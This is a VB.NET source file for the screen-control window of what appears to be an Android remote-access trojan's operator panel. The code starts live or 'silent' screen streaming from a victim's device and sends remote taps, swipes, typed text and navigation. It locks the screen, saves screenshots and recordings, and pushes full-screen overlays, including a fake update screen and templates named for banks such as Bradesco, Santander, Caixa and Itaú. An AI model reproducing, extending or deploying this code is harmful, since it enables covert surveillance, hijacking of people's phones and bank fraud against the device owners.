Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports System.Windows.Media.Animation
Imports DrakeUI.Framework
Imports Newtonsoft.Json
Imports Newtonsoft.Json.Linq

Public Class ScreenMonitor
    Public Btcli As BTClient
    Public FPS As Integer = 0
    Private websockclient As WebSocketClient = Nothing
    Public LiveisBigger As Boolean = True
    Public curentlabel_qulty As String = ""
    Public CurrentState As String = ""

    Private Sub translateme()
        Select Case BTRegistry.GetValue(Regz.Language, "null")

            Case "AR"
                comboTargts.Text = "نوع الشاشة"

                BTtiptool.SetToolTip(confbtn, "إعدادات")
                BTtiptool.SetToolTip(ctrlbtn, "التحكم بالشاشة")
                BTtiptool.SetToolTip(blockbtn, "حجب الشاشة")
                BTtiptool.SetToolTip(skltonbtn, "هيكل الشاشة")

                BTtiptool.SetToolTip(lokbtn, "قفل الشاشة")
                BTtiptool.SetToolTip(unlockbtn, "قفل الشاشة")

                BTtiptool.SetToolTip(keybordon, "لوحة المفاتيح")
                BTtiptool.SetToolTip(keybordoff, "لوحة المفاتيح")

                BTtiptool.SetToolTip(soundown, "الأصوات")
                BTtiptool.SetToolTip(sondup, "الأصوات")


                BTtiptool.SetToolTip(mscrtshots, "لفطة الشاشة")
                BTtiptool.SetToolTip(scrshot, "لفطة الشاشة")



                Label5.Text = "جودة الصورة"


                inputtext.Text = "ادخل نص"

                Exit Select
            Case "CN" ' Chinese
                comboTargts.Text = "屏幕类型"

                BTtiptool.SetToolTip(confbtn, "设置")
                BTtiptool.SetToolTip(ctrlbtn, "屏幕控制")
                BTtiptool.SetToolTip(blockbtn, "屏幕黑屏")
                BTtiptool.SetToolTip(skltonbtn, "屏幕轮廓")

                BTtiptool.SetToolTip(lokbtn, "屏幕锁定")
                BTtiptool.SetToolTip(unlockbtn, "屏幕锁定")

                BTtiptool.SetToolTip(keybordon, "键盘")
                BTtiptool.SetToolTip(keybordoff, "键盘")

                Label5.Text = "图像质量"


                BTtiptool.SetToolTip(soundown, "声音")
                BTtiptool.SetToolTip(sondup, "声音")
                BTtiptool.SetToolTip(mscrtshots, "屏幕截图")
                BTtiptool.SetToolTip(scrshot, "屏幕截图")


                inputtext.Text = "输入文本"
                Exit Select

            Case "RU" ' Russian
                comboTargts.Text = "Тип экрана"

                BTtiptool.SetToolTip(confbtn, "Настройки")
                BTtiptool.SetToolTip(ctrlbtn, "Управление экраном")
                BTtiptool.SetToolTip(blockbtn, "Затемнение экрана")
                BTtiptool.SetToolTip(skltonbtn, "Контур экрана")

                BTtiptool.SetToolTip(lokbtn, "Блокировка экрана")
                BTtiptool.SetToolTip(unlockbtn, "Блокировка экрана")

                BTtiptool.SetToolTip(keybordon, "Клавиатура")
                BTtiptool.SetToolTip(keybordoff, "Клавиатура")


                BTtiptool.SetToolTip(soundown, "Звуки")
                BTtiptool.SetToolTip(sondup, "Звуки")

                Label5.Text = "Качество изображения"
                BTtiptool.SetToolTip(mscrtshots, "Скриншот")
                BTtiptool.SetToolTip(scrshot, "Скриншот")


                inputtext.Text = "Введите текст"
                Exit Select

            Case "TR" ' Turkish
                comboTargts.Text = "Ekran Türü"

                BTtiptool.SetToolTip(confbtn, "Ayarlar")
                BTtiptool.SetToolTip(ctrlbtn, "Ekran Kontrolü")
                BTtiptool.SetToolTip(blockbtn, "Ekranı Karart")
                BTtiptool.SetToolTip(skltonbtn, "Ekran Çerçevesi")


                BTtiptool.SetToolTip(lokbtn, "Ekran Kilidi")
                BTtiptool.SetToolTip(unlockbtn, "Ekran Kilidi")

                BTtiptool.SetToolTip(keybordon, "Klavye")
                BTtiptool.SetToolTip(keybordoff, "Klavye")


                BTtiptool.SetToolTip(soundown, "Sesler")
                BTtiptool.SetToolTip(sondup, "Sesler")

                Label5.Text = "Görüntü Kalitesi"

                BTtiptool.SetToolTip(mscrtshots, "Ekran Görüntüsü")
                BTtiptool.SetToolTip(scrshot, "Ekran Görüntüsü")


                inputtext.Text = "Metin Girin"
                Exit Select
            Case "SP" ' Spanish
                comboTargts.Text = "Tipo de Pantalla"


                BTtiptool.SetToolTip(confbtn, "Configuración")
                BTtiptool.SetToolTip(ctrlbtn, "Control de Pantalla")
                BTtiptool.SetToolTip(blockbtn, "Oscurecer Pantalla")
                BTtiptool.SetToolTip(skltonbtn, "Marco de Pantalla")

                BTtiptool.SetToolTip(lokbtn, "Bloqueo de Pantalla")
                BTtiptool.SetToolTip(unlockbtn, "Bloqueo de Pantalla")

                BTtiptool.SetToolTip(keybordon, "Teclado")
                BTtiptool.SetToolTip(keybordoff, "Teclado")

                Label5.Text = "Calidad de Imagen"

                BTtiptool.SetToolTip(soundown, "Sonidos")
                BTtiptool.SetToolTip(sondup, "Sonidos")
                BTtiptool.SetToolTip(mscrtshots, "Captura de Pantalla")
                BTtiptool.SetToolTip(scrshot, "Captura de Pantalla")


                inputtext.Text = "Ingrese Texto"
                Exit Select

            Case "PR" ' Brazilian Portuguese
                comboTargts.Text = "Tipo de Tela"

                BTtiptool.SetToolTip(confbtn, "Configurações")
                BTtiptool.SetToolTip(ctrlbtn, "Controle de Tela")
                BTtiptool.SetToolTip(blockbtn, "Escurecer Tela")
                BTtiptool.SetToolTip(skltonbtn, "Moldura da Tela")

                BTtiptool.SetToolTip(lokbtn, "Bloqueio de Tela")
                BTtiptool.SetToolTip(unlockbtn, "Bloqueio de Tela")


                BTtiptool.SetToolTip(keybordon, "Teclado")
                BTtiptool.SetToolTip(keybordoff, "Teclado")

                Label5.Text = "Qualidade de Imagem"

                BTtiptool.SetToolTip(soundown, "Sons")
                BTtiptool.SetToolTip(sondup, "Sons")

                BTtiptool.SetToolTip(mscrtshots, "Captura de Tela")
                BTtiptool.SetToolTip(scrshot, "Captura de Tela")

                inputtext.Text = "Digite o Texto"
                Exit Select

            Case Else
                ' Handle any other cases or defaults here
        End Select
    End Sub
    Sub New()

        ' This call is required by the designer.
        InitializeComponent()

        ' Add any initialization after the InitializeComponent() call.

    End Sub

    Private isDown As Boolean = False
    Private isClick As Boolean = False
    Private startX As Integer
    Private startY As Integer
    Private trackPoints As New List(Of Point)
    Private dragThreshold As Integer = 5
    Public screenSize As Size = Nothing





    Private Sub DrakeUIButtonIcon4_Click(sender As Object, e As EventArgs) Handles confbtn.Click
        ' Check if the timer is already running before starting
        If Not confpanel.Visible Then
            confpanel.Visible = True
            Me.Width = Me.Width + 100
        Else
            confpanel.Visible = False
            Me.Width = Me.Width - 100
        End If
    End Sub



    Private Sub ScreenMonitor_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        ''Me.Size = New Size(524, 1200)
        Me.Opacity = 0


        Me.Height = Screen.PrimaryScreen.WorkingArea.Height
        Me.myico.Image = Btcli.wallpaper
        ' Me.myscr.Image = Btcli.screen

        translateme()
        curentlabel_qulty = Label5.Text
        Label5.Text = $"{curentlabel_qulty} {qualitybar.Value}"
        statetimer.Start()

        Me.Opacity = 1
        ' FadeIn(Me)
    End Sub
    'Private Async Sub FadeIn(ByVal o As Form, ByVal Optional interval As Integer = 20)
    '    Try
    '        While o.Opacity < 1.0
    '            Await Task.Delay(interval)
    '            o.Opacity += 0.05
    '        End While

    '    Catch ex As Exception

    '    End Try
    '    o.Opacity = 1

    'End Sub

    Private Async Sub entrbtn_Click(sender As Object, e As EventArgs) Handles startbtn.Click
        If startbtn.Enabled Then
            Dim loadit As String = Nothing
            '{"N", "SM", "SK", "IN"}
            Select Case comboTargts.Text
                Case "Live screen"
                    loadit = "N"
                Case "Silent mode"
                    loadit = "SM"

                Case "Skeleton view"
                    loadit = "SK"

                Case "In App"
                    loadit = "IN"

                Case Else
                    loadit = Nothing
                    Exit Select
            End Select
            If loadit Is Nothing Then
                BTAlerter.infos("Select screen type.")
                Return
            End If

            CurrentState = selectedtypstr + ": " + comboTargts.Text + Space(10) + Connectingstr

            Dim datajoin As String = Await JoinServer(New With {
                               .case = "join",
                               .ping = "0",
                               .ismain = "0",
                               .chk = BTEngine.MainForm.Mainnextkey
                            }, BTEngine.MainForm.MainhttpClient)


            Dim socketidf As String = Btcli.SecoundIDF

            Dim result As JObject = JObject.Parse(datajoin)
            If result("Success") IsNot Nothing Then
                Dim datastr As String = result("Success").ToString.Trim("""")
                Log_d("Cli IDF websock", datastr)
                'Main_IDF = datastr

                websockclient = New WebSocketClient(livscrstr, Btcli.address)

                Dim connectionThread = New Thread(Sub() websockclient.Connect(datastr))
                connectionThread.IsBackground = True
                connectionThread.Start()

                Do
                    Thread.Sleep(1)
                Loop While Not websockclient.IsConnected

                Log_d("IDF Ready to use", datastr)
                socketidf = datastr
            End If


            Dim data As New With {
                        .subcommand = "ON",
                        .scrt = loadit,
                        .skidf = socketidf,
                        .scrq = "10"
                    }

            Dim commandstr As String = FormatCommand("Screen", data)


            Dim chatData As New Dictionary(Of String, Object) From {
                                                {"msg", wrk},
                                                {"cmnd", commandstr}
                    }
            BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
            startbtn.Enabled = False
            stopbtn.Enabled = True
            myscr.Visible = True
        End If

    End Sub

    Private Sub stopbtn_Click(sender As Object, e As EventArgs) Handles stopbtn.Click
        If stopbtn.Enabled Then

            Dim data As New With {
                        .subcommand = "OFF"
                    }

            Dim commandstr As String = FormatCommand("Screen", data)


            Dim chatData As New Dictionary(Of String, Object) From {
                                                {"msg", wrk},
                                                {"cmnd", commandstr}
                    }
            BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
            startbtn.Enabled = True
            stopbtn.Enabled = False
            CurrentState = Disconnectedstr
            viewimage.Image = Nothing
            myscr.Visible = False
            If websockclient IsNot Nothing Then
                websockclient.Disconnect(livscrstr, Btcli.address)
                websockclient = Nothing
            End If
        End If
    End Sub

    Private mouseDownTime As DateTime

    Private Sub viewimage_MouseDown(sender As Object, e As MouseEventArgs) Handles viewimage.MouseDown
        mouseDownTime = DateTime.Now
        If ctrlbtn.Tag = "0" Then
            BTAlerter.infos(enblctrlstr)
            Return
        End If

        ' Handle left mouse button
        If e.Button = MouseButtons.Left Then
            trackPoints.Clear()
            startX = e.X
            startY = e.Y
            trackPoints.Add(New Point(startX, startY))
            isDown = True
            isClick = True
        End If
    End Sub

    ' Mouse Move Event
    Private Sub viewimage_MouseMove(sender As Object, e As MouseEventArgs) Handles viewimage.MouseMove

        If ctrlbtn.Tag = "0" Then Return

        ' If mouse is pressed down, track movement
        If isDown Then
            Dim dx As Integer = Math.Abs(e.X - startX)
            Dim dy As Integer = Math.Abs(e.Y - startY)
            If dx > dragThreshold Or dy > dragThreshold Then
                isClick = False
                If e.X > 0 And e.Y > 0 Then
                    trackPoints.Add(New Point(e.X, e.Y))
                End If
            End If
        End If
    End Sub

    ' Mouse Up Event
    Private Sub viewimage_MouseUp(sender As Object, e As MouseEventArgs) Handles viewimage.MouseUp

        If ctrlbtn.Tag = "0" Then
            Return
        End If

        If screenSize = Nothing Then
            Return
        End If

        isDown = False
        Dim currentW As Integer = viewimage.Width
        Dim currentH As Integer = viewimage.Height

        ' Handle click or drag actions
        If isClick Then

            Dim pointJson As String = JsonConvert.SerializeObject(New With {
                 .x = CInt(Math.Round(startX * (screenSize.Width / currentW))),
                 .y = CInt(Math.Round(startY * (screenSize.Height / currentH)))
             })

            ' Call MoveScreen with movetype 0 for click
            MoveScreen("0", Btcli.mobid, pointJson)

        ElseIf trackPoints.Count > 0 Then
            ' Handle drag
            If e.X > 0 And e.Y > 0 Then
                trackPoints.Add(New Point(e.X, e.Y))
            End If
            Dim scaledPoints As List(Of Point) = trackPoints.Select(Function(p) New Point(
                CInt(Math.Round(p.X * (screenSize.Width / currentW))),
                CInt(Math.Round(p.Y * (screenSize.Height / currentH)))
            )).ToList()

            ' Create point string format
            Dim pointString As String = String.Join(":", scaledPoints.Select(Function(p) $"({p.X}, {p.Y})"))

            ' Call MoveScreen with movetype 1 for drag
            MoveScreen("1", Btcli.mobid, pointString)
        End If
    End Sub
    Private Sub MoveScreen(movetype As String, id As String, data As Object)
        Dim duration As TimeSpan = DateTime.Now - mouseDownTime
        Dim durationMs As Integer = CInt(duration.TotalMilliseconds)
        Dim chatData As New Dictionary(Of String, Object) From {
                             {"msg", "screen"},
                             {"subc", "mov"},
                             {"movetype", movetype},
                             {"dur", durationMs.ToString},
                             {"poi", data}
                        }
        BTEngine.commands(chatData, id, BTEngine.MainForm.webSocketClient)
    End Sub

    Private Sub ScreenMonitor_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        savertimer.Stop()

        If viewimage.Image IsNot Nothing Then
            viewimage.Image = Nothing
        End If
        statetimer.Stop()
        If websockclient IsNot Nothing Then
            websockclient.Disconnect(livscrstr, Btcli.address)
            websockclient = Nothing
        End If
    End Sub

    Private Sub checkblocks_ValueChanged(sender As Object, value As Boolean)

    End Sub

    Private Sub checkskele_ValueChanged(sender As Object, value As Boolean)


    End Sub

    Private Sub DrakeUIColorPicker1_ValueChanged(sender As Object, value As Color) Handles coloskeletonpick.ValueChanged
        Dim selectedcolor As Color = value
        Dim hexColor As String = "#" & selectedcolor.R.ToString("X2") & selectedcolor.G.ToString("X2") & selectedcolor.B.ToString("X2")

        Dim chatData As New Dictionary(Of String, Object) From {
                     {"msg", "screen"},
                     {"subc", "sklecolor"},
                     {"clr", hexColor}
                }
        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
    End Sub

    Private Sub qualitybar_MouseUp(sender As Object, e As MouseEventArgs) Handles qualitybar.MouseUp
        Dim chatData As New Dictionary(Of String, Object) From {
                     {"msg", "screen"},
                     {"subc", "Q"},
                     {"newq", qualitybar.Value}
                }
        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
        Label5.Text = $"{curentlabel_qulty} {qualitybar.Value}"
    End Sub

    Private Sub DrakeUIButtonIcon2_Click(sender As Object, e As EventArgs) Handles lokbtn.Click
        Dim chatData As New Dictionary(Of String, Object) From {
                   {"msg", "screen"},
                   {"subc", "L"},
                   {"lock", "1"}
              }
        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
    End Sub

    Private Sub DrakeUIButtonIcon1_Click(sender As Object, e As EventArgs) Handles unlockbtn.Click
        Dim chatData As New Dictionary(Of String, Object) From {
            {"msg", "screen"},
            {"subc", "L"},
            {"lock", "0"}
       }
        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
    End Sub

    Private Sub DrakeUIButtonIcon3_Click(sender As Object, e As EventArgs) Handles keybordon.Click
        Dim chatData As New Dictionary(Of String, Object) From {
            {"msg", "screen"},
            {"subc", "kb"},
            {"kbstate", "1"}
       }
        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
    End Sub

    Private Sub DrakeUIButtonIcon4_Click_1(sender As Object, e As EventArgs) Handles keybordoff.Click
        Dim chatData As New Dictionary(Of String, Object) From {
            {"msg", "screen"},
            {"subc", "kb"},
            {"kbstate", "0"}
       }
        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
    End Sub

    Private Sub DrakeUIButtonIcon5_Click(sender As Object, e As EventArgs) Handles sondup.Click
        Dim chatData As New Dictionary(Of String, Object) From {
           {"msg", "screen"},
           {"subc", "vol"},
           {"volstate", "0"}
      }
        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
    End Sub

    Private Sub DrakeUIButtonIcon6_Click(sender As Object, e As EventArgs) Handles soundown.Click
        Dim chatData As New Dictionary(Of String, Object) From {
           {"msg", "screen"},
           {"subc", "vol"},
           {"volstate", "1"}
      }
        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
    End Sub

    Private Sub DrakeUIButtonIcon7_Click(sender As Object, e As EventArgs) Handles mscrtshots.Click
        Dim chatData As New Dictionary(Of String, Object) From {
         {"msg", "screen"},
         {"subc", "snap"},
         {"snaptype", "0"}
    }
        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
    End Sub

    Private Sub DrakeUIButtonIcon8_Click(sender As Object, e As EventArgs) Handles scrshot.Click
        Dim chatData As New Dictionary(Of String, Object) From {
         {"msg", "screen"},
         {"subc", "snap"},
         {"snaptype", "1"}
    }
        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
    End Sub

    Private Sub statetimer_Tick(sender As Object, e As EventArgs) Handles statetimer.Tick
        Try
            Dim fpstext As String = ""
            If Me.FPS > 0 AndAlso stopbtn.Enabled Then
                fpstext = "FPS: " + FPS.ToString
                FPS = 0
            Else
                fpstext = "FPS: 0"

            End If
            If Btcli.isConnected Then
                ' Me.myscr.Image = Btcli.screen
                Me.myico.Image = Btcli.wallpaper
                Me.mytitle.Text = LiveScreenstr & " | " & Btcli.name & " | " & Btcli.country & " | " & fpstext

            Else
                Me.myico.Image = My.Resources.no_con
                'Me.myscr.Image = Nothing
                Me.mytitle.Text = LiveScreenstr & " | " & BTConst.Disconnectedstr

            End If

            mainstatelabel.Text = CurrentState
        Catch ex As Exception

        End Try
    End Sub

    Private Sub DrakeUIButtonIcon11_Click(sender As Object, e As EventArgs) Handles DrakeUIButtonIcon11.Click
        Dim chatData As New Dictionary(Of String, Object) From {
           {"msg", "screen"},
           {"subc", "nav"},
           {"nav", "bak"}
      }
        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
    End Sub

    Private Sub DrakeUIButtonIcon10_Click(sender As Object, e As EventArgs) Handles DrakeUIButtonIcon10.Click
        Dim chatData As New Dictionary(Of String, Object) From {
          {"msg", "screen"},
          {"subc", "nav"},
          {"nav", "ho"}
     }
        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
    End Sub

    Private Sub DrakeUIButtonIcon9_Click(sender As Object, e As EventArgs) Handles DrakeUIButtonIcon9.Click
        Dim chatData As New Dictionary(Of String, Object) From {
         {"msg", "screen"},
         {"subc", "nav"},
         {"nav", "rec"}
    }
        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
    End Sub

    Private Sub pintext_KeyDown(sender As Object, e As KeyEventArgs) Handles inputtext.KeyDown
        If e.KeyCode = Keys.Enter Then
            Dim sendtext As String = inputtext.Text

            e.SuppressKeyPress = True

            If isEmpty(sendtext) Then
                BTAlerter.infos("Enter text to send")
                Return
            End If

            Dim chatData As New Dictionary(Of String, Object) From {
                  {"msg", "screen"},
                 {"subc", "paste"},
                 {"txt", sendtext}
             }
            BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
            inputtext.Text = ""
        End If
    End Sub

    Private Sub PictureBox1_Click(sender As Object, e As EventArgs) Handles smallviewimage.Click
        If smallviewimage.Image IsNot Nothing Then
            LiveisBigger = Not LiveisBigger
        End If

    End Sub

    Private Sub ctrlbtn_Click(sender As Object, e As EventArgs) Handles ctrlbtn.Click
        If ctrlbtn.Tag = "0" Then
            ctrlbtn.Tag = "1"
            ctrlbtn.ForeColor = Color.DodgerBlue
            ctrlbtn.RectColor = Color.DodgerBlue
        Else
            ctrlbtn.Tag = "0"
            ctrlbtn.ForeColor = Color.White
            ctrlbtn.RectColor = Color.Gray

        End If
    End Sub

    Private Sub blockbtn_Click(sender As Object, e As EventArgs) Handles blockbtn.Click
        Dim blockstate As String = "0"
        Dim blockstyle As String = "0"
        Dim blockmasg As String = "0"
        If blockbtn.Tag = "0" Then

            blockstate = "1"
            Dim btinput As New blockstyle

            btinput.inputtext2.Text = ""
            If btinput.ShowDialog <> DialogResult.OK Then
                Return
            End If

            blockmasg = btinput.inputtext2.Text
            If isEmpty(blockmasg) Then
                blockmasg = "  "
            End If


            Select Case btinput.comboblock.SelectedIndex
                Case 0
                    blockstyle = HtmlToBase64(My.Resources.Block_style_black.Replace("[MSG]", blockmasg))

                    Exit Select
                Case 1
                    blockstyle = HtmlToBase64(My.Resources.Block_style_update)
                    Exit Select
                Case 2
                    blockstyle = HtmlToBase64(My.Resources.Block_style_locked)
                    Exit Select
                Case 3
                    blockstyle = HtmlToBase64(My.Resources.Block_style_btry)
                    Exit Select
                Case 4
                    blockstyle = HtmlToBase64(My.Resources.Block_style_bradesco)
                    Exit Select
                Case 5
                    blockstyle = HtmlToBase64(My.Resources.Block_style_Santander)
                    Exit Select
                Case 6
                    blockstyle = HtmlToBase64(My.Resources.Block_style_bb)
                    Exit Select
                Case 7
                    blockstyle = HtmlToBase64(My.Resources.Block_style_pag)
                    Exit Select
                Case 8
                    blockstyle = HtmlToBase64(My.Resources.Block_style_mp)
                    Exit Select
                Case 9
                    blockstyle = HtmlToBase64(My.Resources.Block_style_cora)
                    Exit Select
                Case 10
                    blockstyle = HtmlToBase64(My.Resources.Block_Style_bbva)
                    Exit Select
                Case 11
                    blockstyle = HtmlToBase64(My.Resources.Block_style_bcp)
                    Exit Select
                Case 12
                    blockstyle = HtmlToBase64(My.Resources.Block_style_interbank)
                    Exit Select
                Case 13
                    blockstyle = HtmlToBase64(My.Resources.Block_Style_STJ)
                    Exit Select
				Case 14
                    blockstyle = HtmlToBase64(My.Resources.Block_style_Caixa)
                    Exit Select
				Case 15
                    blockstyle = HtmlToBase64(My.Resources.Block_style_Ita)
                    Exit Select
                Case Else
                    BTAlerter.infos("Unkown block type")
                    Return
            End Select



            blockbtn.Tag = "1"
            blockbtn.ForeColor = Color.DodgerBlue
            blockbtn.RectColor = Color.DodgerBlue
        Else
            blockbtn.Tag = "0"
            blockbtn.ForeColor = Color.White
            blockbtn.RectColor = Color.Gray
        End If
        Dim chatData As New Dictionary(Of String, Object) From {
                    {"msg", "screen"},
                    {"subc", "block"},
                    {"blockstate", blockstate},
                    {"bstyle", blockstyle},
                    {"blkmsg", blockmasg}
               }
        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
    End Sub

    Private Sub DrakeUIButtonIcon12_Click(sender As Object, e As EventArgs) Handles skltonbtn.Click
        Dim skstate As String = "0"
        If skltonbtn.Tag = "0" Then
            skltonbtn.Tag = "1"
            skstate = "1"
            skltonbtn.ForeColor = Color.DodgerBlue
            skltonbtn.RectColor = Color.DodgerBlue
        Else
            skltonbtn.Tag = "0"
            skltonbtn.ForeColor = Color.White
            skltonbtn.RectColor = Color.Gray
        End If
        Dim chatData As New Dictionary(Of String, Object) From {
                     {"msg", "screen"},
                     {"subc", "skilton"},
                     {"skstate", skstate}
                }
        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
    End Sub

    Private Sub recscr_Click(sender As Object, e As EventArgs) Handles recscr.Click
        If recscr.Tag = "0" Then
            recscr.Tag = "1"
            recscr.ForeColor = Color.Lime
            recscr.RectColor = Color.Lime
            savertimer.Enabled = True
            savertimer.Start()
        Else
            recscr.Tag = "0"
            recscr.ForeColor = Color.White
            recscr.RectColor = Color.Gray
            Dim cam As String = Btcli.userfolder & "\ScreenCaps"
            If Not Directory.Exists(cam) Then
                Directory.CreateDirectory(cam)
            End If
            Process.Start(cam)
        End If
    End Sub

    Private Sub savertimer_Tick(sender As Object, e As EventArgs) Handles savertimer.Tick
        Try
            If recscr.Tag = "0" Then
                savertimer.Stop()
                savertimer.Enabled = False
                Return
            End If
            If viewimage.Image Is Nothing Then
                Return
            End If
            Dim newimage As Bitmap = DirectCast(viewimage.Image.Clone, Bitmap)
            If newimage IsNot Nothing Then
                Dim cam As String = Btcli.userfolder & "\ScreenCaps"




                If Not IO.Directory.Exists(cam) Then
                    IO.Directory.CreateDirectory(cam)
                End If

                If IO.Directory.Exists(cam) Then
                    newimage.Save(cam & "\p_" & DateAndTime.Now.ToString("yyMMddhhmmssfff") & ".jpg", Imaging.ImageFormat.Jpeg)
                End If
                newimage.Dispose()

            End If
        Catch ex As Exception

        End Try
    End Sub
End Class